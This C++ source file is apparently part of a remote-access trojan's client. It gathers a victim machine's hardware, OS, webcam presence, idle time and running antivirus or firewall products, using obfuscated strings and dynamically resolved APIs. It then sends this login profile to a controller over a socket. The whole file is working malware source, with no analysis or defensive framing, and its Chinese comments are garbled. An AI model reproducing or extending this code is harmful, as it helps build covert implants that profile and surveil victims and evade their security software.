#pragma comment(lib, "strmiids.lib")
#pragma comment(lib, "iphlpapi.lib")
#include <iprtrmib.h>
#include <iphlpapi.h>

//ö����Ƶ�豸
//////////////////////////////////////////////////////////
/*************�ж���Ƶ��ͷ�ļ�*******************/
#include <strmif.h>
#include <uuids.h>
#include "stdafx.h"
#pragma comment(lib, "strmiids.lib")
/**********************************/
UINT EnumDevices()
{
    HINSTANCE Ole32 = LoadLibrary("Ole32.dll");

    typedef void (WINAPI *TCoInitialize)(LPVOID );
    TCoInitialize MyCoInitialize = (TCoInitialize)GetProcAddress(Ole32, "CoInitialize");

    typedef void (WINAPI *TCoUninitialize)(void );
    TCoUninitialize MyCoUninitialize = (TCoUninitialize)GetProcAddress(Ole32, "CoUninitialize");

    typedef HRESULT (WINAPI *TCoCreateInstance)(IN REFCLSID, IN LPUNKNOWN,IN DWORD, IN REFIID, OUT LPVOID FAR* );

    TCoCreateInstance MyCoCreateInstance = (TCoCreateInstance)GetProcAddress(Ole32, "CoCreateInstance");

    HINSTANCE Oleaut32 = LoadLibrary("Oleaut32.dll");

    typedef void (WINAPI *TSysFreeString)(BSTR );
    TSysFreeString MySysFreeString = (TSysFreeString)GetProcAddress(Oleaut32, "SysFreeString");

    MyCoInitialize(NULL);    //COM ���ʼ��
    UINT nCam = 0;

    /////////////////////    Step1        /////////////////////////////////
    //ö�ٲ����豸
    ICreateDevEnum *pCreateDevEnum;                          //�����豸ö����
    //�����豸ö�ٹ�����
    HRESULT hr = MyCoCreateInstance(CLSID_SystemDeviceEnum,    //Ҫ������Filter��Class ID
                                    NULL,                                                //��ʾFilter�����ۺ�
                                    CLSCTX_INPROC_SERVER,                                //����������COM����
                                    IID_ICreateDevEnum,                                  //��õĽӿ�ID
                                    (void**)&pCreateDevEnum);                            //�����Ľӿڶ����ָ��
    if (hr != NOERROR) {
        return FALSE;
    }
    /////////////////////    Step2        /////////////////////////////////
    IEnumMoniker *pEm;                 //ö�ټ�����ӿ�
    //��ȡ��Ƶ���ö����
    hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
    if (hr != NOERROR) {
        return FALSE;
    }
    /////////////////////    Step3        /////////////////////////////////
    pEm->Reset();                                            //����ö������λ
    ULONG cFetched;
    IMoniker *pM;                                            //������ӿ�ָ��
    while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK) {     //��ȡ��һ���豸
        IPropertyBag *pBag;                                  //����ҳ�ӿ�ָ��
        hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
        //��ȡ�豸����ҳ
        if(SUCCEEDED(hr)) {
            VARIANT var;
            var.vt = VT_BSTR;                                //������Ƕ���������
            hr = pBag->Read(L"FriendlyName", &var, NULL);
            //��ȡFriendlyName��ʽ����Ϣ
            if (hr == NOERROR) {
                nCam++;
                MySysFreeString(var.bstrVal);   //�ͷ���Դ���ر�Ҫע��
            }
            pBag->Release();                  //�ͷ�����ҳ�ӿ�ָ��
        }
        pM->Release();                        //�ͷż�����ӿ�ָ��
    }
    MyCoUninitialize();                   //ж��COM��

    if (Ole32)
        FreeLibrary(Ole32);

    if (Oleaut32)
        FreeLibrary(Oleaut32);

    return nCam;
}
//////////////////////////////////////////////////////////

void CPUClockMhzt(char *cTemp)
{
// 	char  dwCPUMhz[10]={0};
//	ReadRegEx(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",  "~MHz", REG_DWORD, (char *)dwCPUMhz, NULL, sizeof(DWORD), 0);

    SYSTEM_INFO siSysInfo;
    //����Ӳ����Ϣ��SYSTEM_INFO�ṹ����
    GetSystemInfo(&siSysInfo);

//	wsprintfA(cTemp, "%d*%sMHz", siSysInfo.dwNumberOfProcessors,dwCPUMhz);
    wsprintfA(cTemp, "%d", siSysInfo.dwNumberOfProcessors);
    return;
}

void ReadRegExg(LPCTSTR lpServiceName,LPTSTR lpSame,LPTSTR lpBuffer, UINT uSize)
{


    char	strSubKey[1024]= {0};



    memset(lpBuffer, 0, uSize);

    memset(strSubKey, 0, sizeof(strSubKey));


    char JYvni08[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};





    wsprintf(strSubKey, JYvni08,lpServiceName);


    ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey,lpSame, REG_SZ, (char *)lpBuffer, NULL, uSize, 0);


}

UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
// 	char	strSubKey[1024];
// 	memset(lpBuffer, 0, uSize);
// 	memset(strSubKey, 0, sizeof(strSubKey));
// 	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
// 	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey,"Remark", REG_SZ, lpBuffer, NULL,uSize, 0);
//
// 	if (lstrlen(lpBuffer) == 0)
// 	m_gFunc.gethostname(lpBuffer, uSize);
// 	return lstrlen(lpBuffer);

    char UtKoF13[] = {'H','o','s','t','\0'};
    ReadRegExg(lpServiceName,UtKoF13,lpBuffer, uSize);


    if (lstrlen(lpBuffer) == 0) {

        gethostname(lpBuffer, uSize);

    }


    return lstrlen(lpBuffer);
}

UINT GetGroupName(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{


    char UtKoF15[] = {'C','o','n','n','e','c','t','G','r','o','u','p','\0'};
    ReadRegExg(lpServiceName,UtKoF15,lpBuffer, uSize);


    if (lstrlen(lpBuffer) == 0) {

        lstrcpy(lpBuffer,"Default");
    }


    return lstrlen(lpBuffer);
}

UINT GetMarkTime(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
    char JYvni04[] = {'M','a','r','k','T','i','m','e','\0'};

    ReadRegExg(lpServiceName,JYvni04,lpBuffer, uSize);

    if (lstrlen(lpBuffer) == 0) {

        lstrcpy(lpBuffer,"����Ϣ");
    }


    return lstrlen(lpBuffer);
}


BOOL IsWow64()
{
    HINSTANCE kernel32 = LoadLibrary("kernel32.dll");

    typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
    LPFN_ISWOW64PROCESS fnIsWow64Process;
    BOOL bIsWow64 = FALSE;
    fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress( kernel32,"IsWow64Process");

    typedef HANDLE (WINAPI *TGetCurrentProcess)(VOID);
    TGetCurrentProcess myGetCurrentProcess = (TGetCurrentProcess)GetProcAddress(kernel32, "GetCurrentProcess");

    if (NULL != fnIsWow64Process) {
        fnIsWow64Process(myGetCurrentProcess(),&bIsWow64);
    }

    if(kernel32)
        FreeLibrary(kernel32);
    return bIsWow64;
}


#include <process.h>
#include <tlhelp32.h>

char* MDecode(char *data,int len)
{
    for (int i = 0; i < len; i++) {
        data[i] += 0x1;
    }
    return data;
}
typedef struct {
    const char *Course;
    const char *Name;
} AYSDFE;
void GetAntivirus(char *AllName)
{

    AYSDFE g_AntiVirus_Data[90] = {
        {"360tray.exe",    "360��ȫ��ʿ"},
        {"360sd.exe",      "360ɱ��"},
        {"a2guard.exe",    "a-squaredɱ��"},
        {"ad-watch.exe",    "Lavasoftɱ��"},
        {"cleaner8.exe",    "The Cleanerɱ��"},
        {"vba32lder.exe",    "vb32ɱ��"},
        {"MongoosaGUI.exe",    "Mongoosaɱ��"},
        {"CorantiControlCenter32.exe",    "Coranti2012ɱ��"},
        {"F-PROT.EXE",    "F-PROTɱ��"},
        {"CMCTrayIcon.exe",    "CMCɱ��"},
        {"K7TSecurity.exe",    "K7ɱ��"},
        {"UnThreat.exe",    "UnThreatɱ��"},
        {"CKSoftShiedAntivirus4.exe",    "Shield Antivirusɱ��"},
        {"AVWatchService.exe",    "VIRUSfighterɱ��"},
        {"ArcaTasksService.exe",    "ArcaVirɱ��"},
        {"iptray.exe",    "Immunetɱ��"},
        {"PSafeSysTray.exe",    "PSafeɱ��"},
        {"nspupsvc.exe",    "nProtectɱ��"},
        {"SpywareTerminatorShield.exe",    "SpywareTerminatorɱ��"},
        {"BKavService.exe",    "Bkavɱ��"},
        {"MsMpEng.exe",    "Microsoft Security Essentials"},
        {"SBAMSvc.exe",    "VIPRE"},
        {"ccSvcHst.exe",    "Nortonɱ��"},
        {"QQ.exe",    "QQ"},
        {"f-secure.exe",    "����"},
        {"avp.exe",        "����˹��"},
        {"KvMonXP.exe",    "����ɱ��"},
        {"RavMonD.exe",    "����ɱ��"},
        {"Mcshield.exe",   "�󿧷�"},
        {"egui.exe",       "NOD32"},
        {"kxetray.exe",    "��ɽ����"},
        {"knsdtray.exe",   "��ţɱ��"},
        {"TMBMSRV.exe",    "����ɱ��"},
        {"avcenter.exe",   "Avira(С��ɡ)"},
        {"ashDisp.exe",    "Avast���簲ȫ"},
        {"rtvscan.exe",    "ŵ��ɱ��"},
        {"ksafe.exe",      "��ɽ��ʿ"},
        {"QQPCRTP.exe",    "QQ���Թܼ�"},
        {"Miner.exe",    "������ʯ"},
        {"AYAgent.aye",    "��������"},
        {"patray.exe",    "����ʿ"},
        {"V3Svc.exe",    "����ʿV3"},
        {"avgwdsvc.exe",    "AVGɱ��"},
        {"ccSetMgr.exe",    "��������"},
        {"QUHLPSVC.EXE",    "QUICK HEALɱ��"},
        {"mssecess.exe",    "΢��ɱ��"},
        {"SavProgress.exe",    "Sophosɱ��"},
        {"fsavgui.exe",    "F-Secureɱ��"},
        {"vsserv.exe",    "�������"},
        {"remupd.exe",    "��è��ʿ"},
        {"FortiTray.exe",    "����"},
        {"safedog.exe",    "��ȫ��"},
        {"parmor.exe",    "ľ�����"},
        {"beikesan.exe",    "�����ư�ȫ"},
        {"KSWebShield.exe",    "��ɽ����"},
        {"TrojanHunter.exe",    "ľ������"},
        {"GG.exe",    "�޶����ΰ�ȫ��"},
        {"adam.exe",    "��ӥ��ȫ����"},
        {"AST.exe",    "����Ѳ��"},
        {"ananwidget.exe",    "ī�߰�ȫר��"},
        {"AVK.exe",    "GData"},
        {"ccapp.exe",    "Symantec Norton"},
        {"avg.exe",    "AVG Anti-Virus"},
        {"spidernt.exe",    "Dr.web"},
        {"Mcshield.exe",    "Mcafee"},
        {"avgaurd.exe",    "Avira Antivir"},
        {"F-PROT.exe",    "F-Prot AntiVirus"},
        {"vsmon.exe",    "ZoneAlarm"},
        {"avp.exee",    "Kaspersky"},
        {"cpf.exe",    "Comodo"},
        {"outpost.exe",    "Outpost Firewall"},
        {"rfwmain.exe",    "���Ƿ���ǽ"},
        {"kpfwtray.exe",    "��ɽ����"},
        {"FYFireWall.exe",    "���Ʒ���ǽ"},
        {"MPMon.exe",    "΢����������"},
        {"pfw.exe",    "��������ǽ"},
        {"S.exe",    "��ץ��"},
        {"1433.exe",    "��ɨ1433"},
        {"DUB.exe",    "�ڱ���"},
        {"ServUDaemon.exe",    "����S-U"},
        {"BaiduSdSvc.exe",    "�ٶ�ɱ��"},
        {"  ",    "  "}
    };
    typedef BOOL (WINAPI *TProcess32First)(HANDLE,LPPROCESSENTRY32);
    typedef BOOL (WINAPI *TProcess32Next)(HANDLE,LPPROCESSENTRY32);

    typedef HANDLE (WINAPI *TCreateToolhelp32Snapshot)(DWORD,DWORD);
    HINSTANCE kernel32 = LoadLibrary("kernel32.dll");
    TCreateToolhelp32Snapshot myCreateToolhelp32Snapshot = (TCreateToolhelp32Snapshot)GetProcAddress(kernel32, "CreateToolhelp32Snapshot");
    TProcess32First myProcess32First = (TProcess32First)GetProcAddress(kernel32, "Process32First");
    TProcess32Next myProcess32Next = (TProcess32Next)GetProcAddress(kernel32, "Process32Next");


    PROCESSENTRY32 pe;
    DWORD dwRet;
    HANDLE hSP = myCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    int t=0;
    if (hSP) {
        for (;;) {
            pe.dwSize = sizeof( pe );

            if (strstr(g_AntiVirus_Data[t].Course, " " ))
                break;

            for (dwRet = myProcess32First(hSP, &pe); dwRet; dwRet = myProcess32Next(hSP, &pe)) {
                if (lstrcmpi( g_AntiVirus_Data[t].Course, pe.szExeFile) == 0) {
                    lstrcatA(AllName, g_AntiVirus_Data[t].Name);
                    lstrcatA(AllName, " ");

                    break;
                }
            }

            t++;

        }
    }

    CloseHandle(hSP);

    if (lstrlen(AllName) == 0)
        lstrcpy(AllName,"-/-");

    if(kernel32)
        FreeLibrary(kernel32);

    return;
}

BOOL GetNtVersionNumbers(DWORD&dwMajorVer, DWORD& dwMinorVer,DWORD& dwBuildNumber)
{
    BOOL bRet= FALSE;
    HMODULE hModNtdll= NULL;
    if (hModNtdll= ::LoadLibraryW(L"ntdll.dll")) {
        typedef void (WINAPI *pfRTLGETNTVERSIONNUMBERS)(DWORD*,DWORD*, DWORD*);
        pfRTLGETNTVERSIONNUMBERS pfRtlGetNtVersionNumbers;
        pfRtlGetNtVersionNumbers = (pfRTLGETNTVERSIONNUMBERS)::GetProcAddress(hModNtdll, "RtlGetNtVersionNumbers");
        if (pfRtlGetNtVersionNumbers) {
            pfRtlGetNtVersionNumbers(&dwMajorVer, &dwMinorVer,&dwBuildNumber);
            dwBuildNumber&= 0x0ffff;
            bRet = TRUE;
        }

        ::FreeLibrary(hModNtdll);
        hModNtdll = NULL;
    }

    return bRet;
}


int GetNetwork()//��ȡ��������Mbps
{
    DWORD dwSize = 0;
    DWORD dwRetVal = 0;
    DWORD speed = 0;
    DWORD dwspeed = 0;
    MIB_IFTABLE *pIfTable;
    MIB_IFROW *pIfRow;

    pIfTable = (MIB_IFTABLE *) malloc(sizeof (MIB_IFTABLE));
    if (pIfTable == NULL) {
        return 1;
    }
    dwSize = sizeof (MIB_IFTABLE);
    if (GetIfTable(pIfTable, &dwSize, FALSE) == ERROR_INSUFFICIENT_BUFFER) {
        free( pIfTable);
        pIfTable = (MIB_IFTABLE *) malloc(dwSize);
        if (pIfTable == NULL) {
            return 1;
        }
    }
    if ((dwRetVal = GetIfTable(pIfTable, &dwSize, FALSE)) == NO_ERROR) {
        pIfRow = (MIB_IFROW *) & pIfTable->table[0];
        speed = pIfRow->dwSpeed;
        dwspeed = speed/1000/1000; //mbps
    }
    if (pIfTable != NULL) {
        free(pIfTable);
        pIfTable = NULL;
    }

    return dwspeed;
}

////////////////////////////////////////////////////////////////////////////
// Get System Information
// DWORD CPUClockMhz()
// {
// 	HKEY	hKey;
// 	DWORD	dwCPUMhz;
// 	DWORD	dwBytes = sizeof(DWORD);
// 	DWORD	dwType = REG_DWORD;
// 	RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
// 	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
// 	RegCloseKey(hKey);
// 	return	dwCPUMhz;
// }

//����������Ϣ
int SendLoginInfo(const DLLSERVER_INFO& dll_info, CClientSocket *pClient, DWORD dwSpeed)
{
    char str_ServiceName[256];
    // ��¼��Ϣ
    LOGININFO	LoginInfo;
    memset(&LoginInfo,0,sizeof(LOGININFO));

    // ��ʼ��������
    LoginInfo.bToken = TOKEN_LOGIN; // ����Ϊ��¼

    lstrcpy(str_ServiceName,dll_info.ServiceName);

// 	char ServerINIPath[MAX_PATH]={0};
// 	GetModuleFileName(NULL,ServerINIPath,sizeof(ServerINIPath));
// 	PathRemoveFileSpec(ServerINIPath);
// 	lstrcat(ServerINIPath,"\\Server.ini");
    //����
// 	memset(LoginInfo.UpGroup,0,sizeof(LoginInfo.UpGroup));
// 	GetPrivateProfileString("INSTALL","Group","Default",LoginInfo.UpGroup,sizeof(LoginInfo.UpGroup),ServerINIPath);
    //���߷���
    const char	*UpRow = NULL;
    char Group[256];

    if(GetGroupName(str_ServiceName, Group, sizeof(Group))==0) {    //no
        UpRow = "Default";
    } else {
        UpRow=Group;
    }

    lstrcpy(LoginInfo.UpGroup,UpRow);

    // ������
    char hostname[256];

    GetHostRemark(str_ServiceName, hostname, sizeof(hostname));
    // ���ӵ�IP��ַ
    sockaddr_in  sockAddr;
    memset(&sockAddr, 0, sizeof(sockAddr));
    int nSockAddrLen = sizeof(sockAddr);
    getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

    memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));

    memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));

    // ������
// 	GetPrivateProfileString("INSTALL","Remark","Default",LoginInfo.HostName,sizeof(LoginInfo.HostName),ServerINIPath);
// 	if (strlen(LoginInfo.HostName)==0)
// 	{
// 		m_gFunc.gethostname(LoginInfo.HostName, sizeof(LoginInfo.HostName));
// 	}
// 	char hostname[256];
// 	GetHostRemark("BITS", LoginInfo.HostName, sizeof(LoginInfo.HostName));
    // CPU��Ƶ
// 	LoginInfo.CPUClockMhz1 = CPUClockMhz();
//     //CPU������
//  	SYSTEM_INFO siSysInfo;
// 	//����Ӳ����Ϣ��SYSTEM_INFO�ṹ����
//  	GetSystemInfo(&siSysInfo);
//     LoginInfo.CPUNumber=siSysInfo.dwNumberOfProcessors;
    // ����ϵͳ
    LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // ע��ת������
    GetNtVersionNumbers(LoginInfo.OsVerInfoEx.dwMajorVersion,LoginInfo.OsVerInfoEx.dwMinorVersion,LoginInfo.OsVerInfoEx.dwBuildNumber);
    HKEY	hKey;
    DWORD	dwCPUMhz;
    DWORD	dwBytes = sizeof(DWORD);
    DWORD	dwType = REG_DWORD;
    RegOpenKey(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
    RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
    RegCloseKey(hKey);
    LoginInfo.CPUClockMhz1=(float)dwCPUMhz/1024;
    // CPU
    CPUClockMhzt(LoginInfo.CPUClockMhz);
// char qqq[100];
// wsprintf(qqq,"%d",(LoginInfo.CPUClockMhz));
// OutputDebugStringA(qqq);
    // ����
    LoginInfo.Mbs = GetNetwork();
    // �汾��Ϣ
    const char	*lpVersion = NULL;
    lpVersion =	dll_info.Version;
    wsprintf(LoginInfo.Ver,lpVersion);
    if (lpVersion == NULL)
        wsprintf(LoginInfo.Ver,"V5.0");
    // �ڴ�
    MEMORYSTATUSEX	MemInfo; //��GlobalMemoryStatusEx����ʾ2G�����ڴ�
    MemInfo.dwLength=sizeof(MemInfo);
    GlobalMemoryStatusEx(&MemInfo);
    DWORDLONG strMem = MemInfo.ullTotalPhys/1024/1024;
    LoginInfo.MemSize = (unsigned long)strMem;

    //Ӳ�̿ռ�
    ULARGE_INTEGER nTotalBytes,nTotalFreeBytes,nTotalAvailableBytes;
    unsigned long nAllGB = 0, nFreeGB = 0;
    DWORD drivertype;
    CHAR driver[10];//, strPrint[128];
    for(int i=0; i<26; i++) {
        driver[0] = i + ('B');
        driver[1] = (':');
        driver[2] = ('\\');
        driver[3] = 0;
        drivertype = GetDriveType(driver);
        if(drivertype!=DRIVE_FIXED)
            continue;
        GetDiskFreeSpaceEx(driver,&nTotalAvailableBytes,&nTotalBytes,&nTotalFreeBytes);
        nAllGB = (unsigned long)(nAllGB + nTotalBytes.QuadPart/1024/1024);
        //		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;  //ʣ�����
    }
    // Ӳ��
    LoginInfo.DriverSize = nAllGB;
    // Speed
    LoginInfo.dwSpeed = dwSpeed;

    LoginInfo.bIsWebCam = EnumDevices(); //û������ͷ

    LoginInfo.bIsWow64  = IsWow64();
////////////////
    memset(LoginInfo.szAntivirus,0,100);

    GetAntivirus(LoginInfo.szAntivirus);
    // �û�״̬
    LoginInfo.bIsActive = false;
    //�Ƿ�
    LASTINPUTINFO lpi;
    lpi.cbSize = sizeof(lpi);
    GetLastInputInfo(&lpi);//��ȡ�ϴ����������ʱ�䡣
    if ((::GetTickCount()-lpi.dwTime)>1000*60*3) { //5����
        //��ǰϵͳ�Ѿ�������1����
        LoginInfo.bIsActive = true;
    }

    //����װʱ��

//	GetPrivateProfileString("INSTALL","Time","Error",LoginInfo.szInstallTime,sizeof(LoginInfo.szInstallTime),ServerINIPath);

    GetMarkTime(str_ServiceName, LoginInfo.szInstallTime, sizeof(LoginInfo.szInstallTime));   // no

    //ͨѶ����
    lstrcpy(LoginInfo.szOnlinePass,	dll_info.SocketHead);

// 	char jsbHj10[] = {'%','d','\0'};
// 	DWORD t=GetTickCount();
// 	char day[100];
// 	char hour[100];
// 	char min[100];
// 	wsprintf(day, jsbHj10, t/86400000);
// 	t%=86400000;
// 	wsprintf(hour,jsbHj10, t/3600000);
// 	t%=3600000;
// 	wsprintf(min, jsbHj10, t/60000);
//
// 	char *d="��";
// 	char *h="ʱ";
// 	char *m="��";
// 	char UZftZ01[] = {'%','s','%','s','%','s','%','s','%','s','%','s','\0'};
//
// 	wsprintf(LoginInfo.szRunTime,UZftZ01, day,d,hour,h,min,m);



    int nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));

    return nRet;
}

